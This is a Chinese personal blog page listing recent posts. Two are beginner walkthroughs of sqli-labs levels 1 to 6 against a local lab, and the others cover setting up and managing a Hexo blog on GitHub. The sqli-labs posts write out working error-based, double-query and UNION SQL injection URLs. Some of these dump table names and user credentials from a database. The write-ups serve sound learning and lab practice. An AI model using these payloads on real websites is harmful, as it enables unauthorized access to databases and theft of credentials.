<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="Keep up!"><meta name="keywords" content=""><meta name="author" content="某獠,undefined"><meta name="copyright" content="某獠"><title>【Joker】</title><link rel="stylesheet" href="/css/fan.css"><link rel="stylesheet" href="/css/thirdparty/jquery.mCustomScrollbar.min.css"><link rel="icon" href="/favicon.ico"><!-- script(src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML")--><script src="/js/mathjax/mathjax.js"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({
    tex2jax: {inlineMath: [['$', '$'], ['\\(', '\\)']]}
});
</script><script>var isPassword = '' || false;
if (isPassword) {
    if (prompt('请输入文章密码') !== '') {
        alert('密码错误！');
        history.back();
    }
}</script><script>window.GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
}</script></head><body><canvas id="universe"></canvas><!--#body--><div id="sidebar"><div class="author-info"><div class="author-info-avatar"><img class="author-info-avatar-img" src="/avatar.png"></div><div class="author-info-name">某獠</div><div class="author-info-description">Keep up!</div><div class="links-buttons"><a class="links-button button-hover" href="https://github.com/PowerfulJoker/PowerfulJoker.github.io" target="_blank">GitHub<i class="icon-dot bg-color5"></i></a><a class="links-button button-hover" href="mailto:741218399@qq.com" target="_blank">E-Mail<i class="icon-dot bg-color7"></i></a><a class="links-button button-hover" href="tencent://message/?uin=741218399&amp;Site=&amp;Menu=yes" target="_blank">QQ<i class="icon-dot bg-color2"></i></a></div><div class="author-info-articles"><a class="author-info-articles-archives article-meta" href="/archives"><span class="pull-top">日志</span><span class="pull-bottom">14</span></a><a class="author-info-articles-tags article-meta" href="/tags"><span class="pull-top">标签</span><span class="pull-bottom">7</span></a><a class="author-info-articles-categories article-meta" href="/categories"><span class="pull-top">分类</span><span class="pull-bottom">4</span></a></div></div></div><div id="main-container"><header><div id="menu-outer"><i class="menu-list-icon fas fa-bars"></i><nav id="menu-inner"><a class="menu-item" href="/">首页</a><a class="menu-item" href="/tags">标签</a><a class="menu-item" href="/categories">分类</a><a class="menu-item" href="/archives">归档</a><a class="menu-item" href="/about">关于</a></nav><div class="right-info"><a class="title-name" href="/">Joker</a><span id="now-time"></span></div></div></header><div id="content-outer"><div id="content-inner"><div id="recent-posts"><!-- each post in page.posts.sort('date', -1).limit(10).toArray()--><!-- config中配置按照什么排序--><div class="recent-post-item"><a class="post-title" href="/2019/11/21/%E5%B0%8F%E7%99%BD%E8%8F%9C%E9%B8%9F%E7%9A%84sqli-labs%E9%97%AF%E5%85%B35-6/">小白菜鸟的sqli-labs闯关5-6</a><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 更新于 2019-11-22</time><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/categories/Web/">Web</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></div></div><div class="post-content"><div class="main-content content"><p>Sqli-labs的第5，6关是基于错误的sql注入的一种: Double SQL Injection(双查询注入)，在讲解题步骤前，先来介绍一下双查询注入<br></p>
<h2 id="Double-SQL-Injection"><a href="#Double-SQL-Injection" class="headerlink" title="Double SQL Injection"></a>Double SQL Injection</h2><p>Double SQL Injection（双查询注入）: 通过构造SQL语句，将有用信息显示在SQL报错信息中的SQL注入技术。(参考博文给出的定义，详情见参考博文链接)<br><br>攻击条件: mysql数据库 版本&lt;8.0</p>
<h3 id="适用情况："><a href="#适用情况：" class="headerlink" title="适用情况："></a>适用情况：</h3><p>SQL语句正确时，则页面正常返回，但返回的页面中不包含任何有用的信息，而当SQL语句错误时，页面会显示SQL错误信息。</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><h4 id="涉及的函数"><a href="#涉及的函数" class="headerlink" title="涉及的函数"></a>涉及的函数</h4><p>concat(): 拼接字符串<br>rand(): 产生随机数，rand函数可接受一个整数参数，当该参数固定时，产生的随机数(随机数列)也是固定的<br>floor(): 向下取整函数，接受一个float型参数，返回小于等于输入参数的最大整数。<br>count(): 用于计数，通常用于统计行数，常与group by连用<br>group by语句： 对查询结果以某字段进行分组</p>
<p>通过下面这个例子来讲解Double SQL Injection的原理</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select floor(rand(14)*2) c, count(*) from information_schema.columns group by c;</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &apos;0&apos; for key &apos;group_key&apos;</span><br></pre></td></tr></table></figure>
<p>我们将这条sql语句来分开进行解读：<br><br>1.rand(14)<br><br>首先是rand()函数，当其参数固定时，产生的随机数(随机数列是固定的)，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select rand(14)</span><br><span class="line">    -&gt; ;</span><br><span class="line">+------------------+</span><br><span class="line">| rand(14)         |</span><br><span class="line">+------------------+</span><br><span class="line">| 0.65778395967352 |</span><br><span class="line">+------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select rand(14);</span><br><span class="line">+------------------+</span><br><span class="line">| rand(14)         |</span><br><span class="line">+------------------+</span><br><span class="line">| 0.65778395967352 | #与上次查询相同</span><br><span class="line">+------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select rand(14) from mysql.user;</span><br><span class="line">+------------------+</span><br><span class="line">| rand(14)         |</span><br><span class="line">+------------------+</span><br><span class="line">| 0.65778395967352 | #与上次查询相同</span><br><span class="line">| 0.13113588572586 | </span><br><span class="line">| 0.68232758034237 |</span><br><span class="line">+------------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>2.floor(rand(14)*2)<br></p>
<p>rand(14)\*2将随机数范围控制在[0,2),因此floor(rand(14)*2)产生的数字为0或1。由于rand(14)产生的随机数列是固定的，如下所示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select floor(rand(14)*2) from information_schema.columns limit 1,4;</span><br><span class="line"># 表是随便选取的，由于要使mysql报错只需要前四位，所以限定输出前四位</span><br><span class="line">+-------------------+</span><br><span class="line">| floor(rand(14)*2) |</span><br><span class="line">+-------------------+</span><br><span class="line">|                 1 |</span><br><span class="line">|                 0 |</span><br><span class="line">|                 1 |</span><br><span class="line">|                 0 |</span><br><span class="line">+-------------------+</span><br></pre></td></tr></table></figure>
3.group by与count()<br>
在SQL语句中有count和group by，Mysql同样会先创建一张临时表，有tally和设置了UNIQUE约束的group_key两个字段。<br>

<p>创建好临时表后，Mysql开始逐行扫描information_schema.columns表<br><br>第一次扫描：<br><br>扫描到的第一个分组列是floor(rand(14)*2)，计算出其值为1，便去查询临时表中是否有group_key为1的行，发现没有，便在临时表中新增一行，group_key为floor(rand(14)*2)=0,所以此时实际插入到临时表的一行group_key为0，tally为1，临时表变成了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+--------------------+-------+</span><br><span class="line">| group_key          | tally |</span><br><span class="line">+--------------------+-------+</span><br><span class="line">| 0                  |     1 |</span><br><span class="line">+--------------------+-------+</span><br></pre></td></tr></table></figure>
<p>第二次扫描：<br><br>扫描到的分组列是floor(rand(14)*2)，计算出其值为1，便去查询临时表中是否有group_key为1的行，发现没有，便在临时表中新增一行，但此时group_key为floor(rand(14)*2)=0，临时表中已经存在，sql报错</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+--------------------+-------+</span><br><span class="line">| group_key          | tally |</span><br><span class="line">+--------------------+-------+</span><br><span class="line">| 0                  |     1 |</span><br><span class="line">+--------------------+-------+</span><br><span class="line">| floor(rand(14)*2)=0|       |  &lt;-插入floor(rand(14)*2)</span><br><span class="line">+--------------------+-------+</span><br></pre></td></tr></table></figure>
<p>报错信息会把临时表中重复的字段暴露出来，因此我们可以将查询的数据库名、表名、字段名与floor(rand(14)*2)用concat()函数拼接在一起，报错时这些信息就会暴露出来。<br></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select concat((select database()), floor(rand(14)*2)) c, count(*) from information_schema.columns group by c;</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &apos;mysql0&apos; for key &apos;group_key&apos;</span><br></pre></td></tr></table></figure>
<p>此时我们就能得到数据库名称了。类似的，通过构造以下格式的sql语句我们可以得到我们想要的其它信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select concat(获取想要信息的查询语句, floor(rand(14)*2)) c, count(*) from information_schema.columns group by c;</span><br><span class="line">#由于该语句包含两个查询语句，所以被称为双查询语句</span><br></pre></td></tr></table></figure>
<p>讲到这里，相信大家应该已经会Less-5和Less-6了吧，不懂的话可以再看一遍，或者直接看下面的参考博文，更详细哦。</p>
<h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p>根据页面提示，在hackerbar或网址栏中输入：<a href="http://127.0.0.1:8086/sqli-labs-master/Less-5/?id=1，出现如下提示：" target="_blank" rel="noopener">http://127.0.0.1:8086/sqli-labs-master/Less-5/?id=1，出现如下提示：</a></p>
<p><img src="/images/a401.png" alt="note"><br>页面正常返回，但看不显示查询信息，将get请求改为：?id=1’ ,出现如下提示：</p>
<p><img src="/images/a402.png" alt="show_error"><br>说明id的类型是字符型，且服务器查询语句使用单引号闭合,并且可能存在双查询注入(之所以说可能，是因为假设我们此时不知道mysql的版本)。<br><br>使用order by 语句探测查询的字段数，因为接下来要使用union语句，按照前面介绍的构造SQL语句,在hackerbar或网址栏中输入：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8086/sqli-labs-master/Less-5/?id=1&apos; union select 1,concat((select database()),floor(rand(14)*2)) c ,count(*) from information_schema.columns group by c --+</span><br></pre></td></tr></table></figure>

<p><img src="/images/a403.png" alt="table_name"><br>也可以构造成以下形式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8086/sqli-labs-master/Less-5/?id=1&apos; and &apos;1&apos; = (select count(*) from information_schema.tables group by concat((select database()),floor(rand(14)*2)))  --+</span><br></pre></td></tr></table></figure>
<p>该形式不需探测字段数。<br><br>接下来依样画葫芦对表名，字段名和数据进行双查询注入便可。</p>
<h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><p>该题与上题唯一的不同便是服务器查询语句使用双引号闭合，同样构造双查询语句，从报错信息得到我们需要的信息即可。</p>
<p>参考博文：<a href="https://blog.csdn.net/wn314/article/details/89297560" target="_blank" rel="noopener">https://blog.csdn.net/wn314/article/details/89297560</a></p>
</div></div><a class="button-hover more" href="/2019/11/21/%E5%B0%8F%E7%99%BD%E8%8F%9C%E9%B8%9F%E7%9A%84sqli-labs%E9%97%AF%E5%85%B35-6/#more">阅读全文</a></div><div class="recent-post-item"><a class="post-title" href="/2019/11/17/%E5%B0%8F%E7%99%BD%E8%8F%9C%E9%B8%9F%E7%9A%84sqli-labs%E9%97%AF%E5%85%B31-4/">小白菜鸟的sqli-labs闯关1-4</a><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 更新于 2019-11-17</time><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/categories/Web/">Web</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a><span>&nbsp;|&nbsp;</span><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/tags/%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84%E6%B3%A8%E5%85%A5/">基于错误的注入</a></div></div><div class="post-content"><div class="main-content content"><p>本博文只讲述Less-1的具体解法，其实对Less-2~4都只是依样画葫芦，只不过多3，4关多了点变通，本博文旨在让小白新手体验SQL注入的流程，而且本文默认读者已经基本掌握了sql语法。若非新手，可直接略过本文。<br><br>SQL注入的攻击流程：</p>
<ol>
<li>判断注入点</li>
<li>判断注入点类型</li>
<li>判断数据库类型</li>
<li>获取数据库数据</li>
</ol>
<p>基于错误的注入</p>
<ul>
<li>字符型</li>
<li>数字型</li>
<li>双查询注入(Double SQL Injection)</li>
</ul>
<p>sqli-labs的Less-1~4为基于错误的注入，注入类型为字符型和数字型</p>
<h2 id="一、判断注入点"><a href="#一、判断注入点" class="headerlink" title="一、判断注入点"></a>一、判断注入点</h2><p>常见的注入点为GET，POST和Header</p>
<p><img src="/images/a301.png" alt="get_id"><br>根据页面提示,先尝试使用GET方法输入id进行查询，在浏览器的网址输入框或是Firefox的Hackerbar中输入：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8086/sqli-labs-master/Less-1/?id=1</span><br></pre></td></tr></table></figure>
<p>输出如下页面：</p>
<p><img src="/images/a302.png" alt="show_id"></p>
<p>说明服务器是通过GET方式传输id参数来进行数据库查询的。</p>
<h2 id="二、判断注入点类型"><a href="#二、判断注入点类型" class="headerlink" title="二、判断注入点类型"></a>二、判断注入点类型</h2><p>通常是先判断是字符型还是数字型注入<br><br>（以此为例）对于字符型注入的判断方法是在id参数后加单引号或双引号进行测试：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8086/sqli-labs-master/Less-1/?id=1&apos;</span><br><span class="line">http://127.0.0.1:8086/sqli-labs-master/Less-1/?id=1&quot;</span><br></pre></td></tr></table></figure>
<p>如果出现报错，则说明是字符型注入<br>对于数字型注入的判断方法是:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8086/sqli-labs-master/Less-1/?id=1 and 1=1  #返回成功</span><br><span class="line">http://127.0.0.1:8086/sqli-labs-master/Less-1/?id=1 and 1=2  #返回失败</span><br></pre></td></tr></table></figure>
<p>若出现该情况，则说明是数字型注入。</p>
<p>在该题中，在网址框或Hackerbar中输入<code>http://127.0.0.1:8086/sqli-labs-master/Less-1/?id=1&#39;</code>，出现以下报错信息：</p>
<p><img src="/images/a303.png" alt="error_info"></p>
<ul>
<li>说明注入类型为字符型注入,且id的闭合符号为单引号</li>
</ul>
<h2 id="三、判断数据库类型"><a href="#三、判断数据库类型" class="headerlink" title="三、判断数据库类型"></a>三、判断数据库类型</h2><p>由第二步中的报错信息可知，数据类型为Mysql(其实由于是我们自己搭建的训练平台，数据库类型不用判断就知道了😂但还是假装判断一波)</p>
<p>这里给出常见的网站架构，没听过的可自行百度：</p>
<ul>
<li>asp + access</li>
<li>asp + mssql</li>
<li>asp.net + mssql</li>
<li>php + mysql</li>
<li>Jsp + oracle</li>
<li>Jsp + mysql</li>
</ul>
<p>针对不同类型数据库系统的sql注入的基础知识：<br><a href="https://websec.ca/kb/sql_injection" target="_blank" rel="noopener">https://websec.ca/kb/sql_injection</a> (可作为字典使用)</p>
<h2 id="四、获取数据库的数据"><a href="#四、获取数据库的数据" class="headerlink" title="四、获取数据库的数据"></a>四、获取数据库的数据</h2><p>在获取数据库的数据之前，还需要确定服务器使用id进行的sql查询的语句中查询了几个字段，以及页面显示的数据，分别是第几个字段。在开始之前，先来介绍以下mysql中几个重要的函数和数据库和表名。</p>
<ul>
<li>information_schema：数据库中所有的数据库名，表名和列名都存放于此。<br>表：<br>schemata:存放所有数据库名的表<br>tables：存放所有表名的表<br>columns：存放所有列名的表<br>字段：<br>table_schema：数据库名<br>table_name:表名<br>column_name: 列名</li>
<li>mysql：主机名，用户名都存放在这<br>表：<br>user：数据库用户信息<br>字段:<br>host:主机名<br>user：用户名<br>password: 密码(高版本的不是这个)</li>
</ul>
<p>函数：<br>database()：当前数据库名称<br>user():当前登录的用户名</p>
<h4 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h4><p>判断出字段数的目的在于，接下来使用的union…语句查询出来的字段数必须与服务器的查询语句的字段数相同，不然查询时会报错(所以用该语句也可以进行字段数的判断，因为有报错信息，这就是为啥叫做基于报错的注入的原因了)。<br><br>使用order by语句进行判断，从页面输出可知，至少存在2个字段，所以从2开始试起，当输入<code>http://127.0.0.1:8086/sqli-labs-master/Less-1/?id=1&#39; order by 4 --+</code>时，出现报错：</p>
<p><img src="/images/a304.png" alt="column_error"><br><em>说明该查询语句查询的字段数为3</em><br><br>p.s. 输入时，使用注释符为– +，– -，%23(%23是#的URL编码)，不能直接使用#或–加空格的方式进行注释，无法传输给服务器，可自行用F12或抓包工具来实验一下。</p>
<h4 id="判断输出字段的位置"><a href="#判断输出字段的位置" class="headerlink" title="判断输出字段的位置"></a>判断输出字段的位置</h4><p>由上一步可知，服务器中查询语句查询的字段数为3，使用以下union联合语句来判断字段的位置：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8086/sqli-labs-master/Less-1/?id=1&apos; and &apos;1&apos;=&apos;2&apos; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
<p>加入and ‘1’=’2’的目的在于使得前面的查询恒为假，使得只输出union后面的查询语句。<br><br>也可以将id参数设置的足够大，保证服务器的查询的表中不存在该id即可，来使得前面的查询语句查询无果，如<code>http://127.0.0.1:8086/sqli-labs-master/Less-1/?id=999&#39; union select 1,2,3 --+</code>。<br>此时页面输出：</p>
<p><img src="/images/a305.png" alt="fields_loca"><br>说明页面输出的是查询语句的第2，3个字段。</p>
<p>接下来就可以获取当前数据库名，数据库的用户表，字段名和数据了。</p>
<h4 id="获取当前数据库名"><a href="#获取当前数据库名" class="headerlink" title="获取当前数据库名"></a>获取当前数据库名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8086/sqli-labs-master/Less-1/?id=1&apos; and &apos;1&apos;=&apos;2&apos; union select 1,2(database()),3 --+</span><br></pre></td></tr></table></figure>
<p>此时页面将在第二个字段输出的位置输出当前使用的数据库名。</p>
<p><img src="/images/a306.png" alt="db_name"></p>
<h4 id="获取数据库中表名"><a href="#获取数据库中表名" class="headerlink" title="获取数据库中表名"></a>获取数据库中表名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8086/sqli-labs-master/Less-1/?id=1&apos; and &apos;1&apos; = &apos;2&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&apos;security&apos; --+</span><br></pre></td></tr></table></figure>
<p>此时页面输出：</p>
<p><img src="/images/pasted-0.png" alt="table_name"></p>
<h4 id="获取users表中的字段名"><a href="#获取users表中的字段名" class="headerlink" title="获取users表中的字段名"></a>获取users表中的字段名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8086/sqli-labs-master/Less-1/?id=1&apos; and &apos;1&apos; = &apos;2&apos; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;users&apos; and table_schema = &apos;security&apos; --+</span><br></pre></td></tr></table></figure>
<p><img src="/images/a308.png" alt="columns_name"></p>
<h4 id="获取user表中的数据"><a href="#获取user表中的数据" class="headerlink" title="获取user表中的数据"></a>获取user表中的数据</h4><p>表名和字段名都知道，这时候就可以获取想要的信息了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8086/sqli-labs-master/Less-1/?id=1&apos; and &apos;1&apos; = &apos;2&apos; union select 1,group_concat(username),group_concat(password) from users --+</span><br></pre></td></tr></table></figure>
<p>此时页面输出：</p>
<p><img src="/images/a309.png" alt="name_pwd"></p>
<p>Less-2：注入类型为数字型，按以上步骤，id参数不需要带引号，后面操作类似<br>Less-3：注入类型为字符型，闭合符号为’)，比第一题需要括号闭合，后面操作类似<br>Less-4：注入类型为字符型，闭合符号为”),操作类似</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>个人感觉，刚入门学习sql注入可先熟悉以下流程，基本知识，原理，然后再自己依样画葫芦做类型题，可以写博客来巩固。</p>
<hr>
<p>再次声明，由于本人也是一枚新手菜鸟，本文难免会有出错，所以若是读者发现本文的错误，可使用QQ或邮箱联系我，万分感谢。</p>
</div></div><a class="button-hover more" href="/2019/11/17/%E5%B0%8F%E7%99%BD%E8%8F%9C%E9%B8%9F%E7%9A%84sqli-labs%E9%97%AF%E5%85%B31-4/#more">阅读全文</a></div><div class="recent-post-item"><a class="post-title" href="/2019/11/16/%E5%9F%BA%E4%BA%8Egithub-hexo%E5%8D%9A%E5%AE%A2%E7%9A%84%E5%86%99%E4%BD%9C%E4%B8%8E%E7%AE%A1%E7%90%86/">基于github+hexo博客的写作与管理</a><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 更新于 2019-11-17</time><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/categories/%E6%9D%82%E8%AE%B0/">杂记</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/tags/github/">github</a><span>&nbsp;|&nbsp;</span><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/tags/hexo/">hexo</a></div></div><div class="post-content"><div class="main-content content"><p>工欲善其事，必先利其器。个人认为，要想在使用github+hexo的个人博客上创作出精美的博客，必然要先做好以下工作：</p>
<ul>
<li>设置一个好看的博客主题</li>
<li>安装并配置hexo-admin插件</li>
<li>学习Markdown语法</li>
</ul>
<h2 id="设置一个好看的博客主题"><a href="#设置一个好看的博客主题" class="headerlink" title="设置一个好看的博客主题"></a>设置一个好看的博客主题</h2><h3 id="找到一个喜欢的主题"><a href="#找到一个喜欢的主题" class="headerlink" title="找到一个喜欢的主题"></a>找到一个喜欢的主题</h3><p>hexo官网上有许多精美的主题，点击图片即可进行预览，点击蓝色字体便可进相应主题的github下，会有介绍如何进行主题安装，以及主题需要哪些依赖包</p>
<p><img src="/images/a201.png" alt="thems_intro"><br>例如我现在所使用的主题是Fan，下图便是其github页面，介绍非常详细</p>
<p><img src="/images/a202.png" alt="fan_github"></p>
<h3 id="在你的博客目录下下载并配置主题"><a href="#在你的博客目录下下载并配置主题" class="headerlink" title="在你的博客目录下下载并配置主题"></a>在你的博客目录下下载并配置主题</h3><h4 id="1-下载"><a href="#1-下载" class="headerlink" title="1.下载"></a>1.下载</h4><p>安装流程通常为：将你选择得到主题使用<code>git clone</code>命令克隆到你的博客目录中的themes目录中，并且安装所需的依赖包，但可能还需要进行其他操作，所以应仔细阅读github下的安装步骤</p>
<ul>
<li>顺带一提，依赖包的安装命令是 <code>npm i --save 依赖包名称</code><br>下载后，在themes目录中，会有一个以该主题为名称的文件夹，确认并记住，接下来要用。</li>
</ul>
<h4 id="2-配置"><a href="#2-配置" class="headerlink" title="2.配置"></a>2.配置</h4><p>修改你博客目录下的_config.yml文件，设置<code>theme: 你选择的主题文件夹名称</code><br>配置完成后<br>使用以下命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo hexo clean #清空缓存 </span><br><span class="line">sudo hexo g		#生成博客</span><br><span class="line">sudo hexo s		#启动服务预览</span><br></pre></td></tr></table></figure>
<p>这样就能在本地浏览器下进行预览了</p>
<h2 id="安装并配置hexo-admin插件"><a href="#安装并配置hexo-admin插件" class="headerlink" title="安装并配置hexo-admin插件"></a>安装并配置hexo-admin插件</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>使用hexo-admin插件，方便后台登录管理hexo博客，编写文章，该插件还支持预览功能，非常方便地进行修改。</p>
<p>插件地址：<a href="https://github.com/jaredly/hexo-admin" target="_blank" rel="noopener">https://github.com/jaredly/hexo-admin</a></p>
<ul>
<li>插件的GitHub中有安装介绍</li>
</ul>
<p>安装命令：<code>npm install --save hexo-admin</code></p>
<p>然后启动你的本地服务预览(上一部分有介绍)<br><br>浏览器访问localhost:4000/admin，出现如下界面。<br><img src="/images/a203.png" alt="hexo_admin"></p>
<h3 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h3><p>Posts：文章管理，进行文章的编辑，删除，新增操作<br><br>Pages: 栏目管理操作，可新增栏目如”标签”、”分类”等页面<br><br>About: hexo-amdin的介绍<br>Deploy: 发布文章<br>settings中可以设置用户名和密码，实现账号登录管理，同时还有图片上传设置和编辑设置</p>
<h2 id="学习Markdown语法"><a href="#学习Markdown语法" class="headerlink" title="学习Markdown语法"></a>学习Markdown语法</h2><p>hexo的博客编辑使用的是Markdown语法<br><br>Markdown是一种轻量级标记语言，它以纯文本形式(易读、易写、易更改)编写文档，并最终以HTML格式发布。<br><br>Markdown也可以理解为将以MARKDOWN语法编写的语言转换成HTML内容的工具。<br><br>所以要想能得心应手的编辑博客，一定要掌握好MARKDOWN语法。</p>
<ul>
<li>Markdown项目地址：<a href="https://github.com/younghz/Markdown" target="_blank" rel="noopener">https://github.com/younghz/Markdown</a> <br><br>里面有详细的MARKDOWN语法的介绍，推荐阅读</li>
</ul>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>其实要想写出好的博客，最重要的还是平时的积累和实践，多阅读别人的博客，看看别人怎么写，自己平时多写博客，我相信最后一定能写出高质量的博客。与诸君共勉。<br></p>
<hr>
<p>由于本人菜鸟一枚，博客中难免有写错的地方，若是读者朋友有发现写错的地方，可邮件或QQ联系我，万分感谢。</p>
</div></div><a class="button-hover more" href="/2019/11/16/%E5%9F%BA%E4%BA%8Egithub-hexo%E5%8D%9A%E5%AE%A2%E7%9A%84%E5%86%99%E4%BD%9C%E4%B8%8E%E7%AE%A1%E7%90%86/#more">阅读全文</a></div><div class="recent-post-item"><a class="post-title" href="/2019/11/16/myblog1/">使用github+hexo搭建个人博客</a><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 更新于 2019-11-16</time><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/categories/%E6%9D%82%E8%AE%B0/">杂记</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/tags/github/">github</a><span>&nbsp;|&nbsp;</span><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/tags/hexo/">hexo</a></div></div><div class="post-content"><div class="main-content content"><p>这是本人的第一篇在github+hexo搭建的博客平台上写的博客，与大多数人一样，这第一篇博文就来写写如何使用github+hexo来搭建个人博客吧。（不然感觉实在对不起我踩的那些坑＞﹏＜初次写博客，有点水，敬请见谅！！)<br>  OS: centos</p>
<h2 id="一、开启你的Github"><a href="#一、开启你的Github" class="headerlink" title="一、开启你的Github"></a>一、开启你的Github</h2><h3 id="1-注册一个Github账号"><a href="#1-注册一个Github账号" class="headerlink" title="1.注册一个Github账号"></a>1.注册一个Github账号</h3><h3 id="2-创建respository"><a href="#2-创建respository" class="headerlink" title="2.创建respository"></a>2.创建respository</h3><p>  创建的respository名称应为：你的Github用户名.github.io</p>
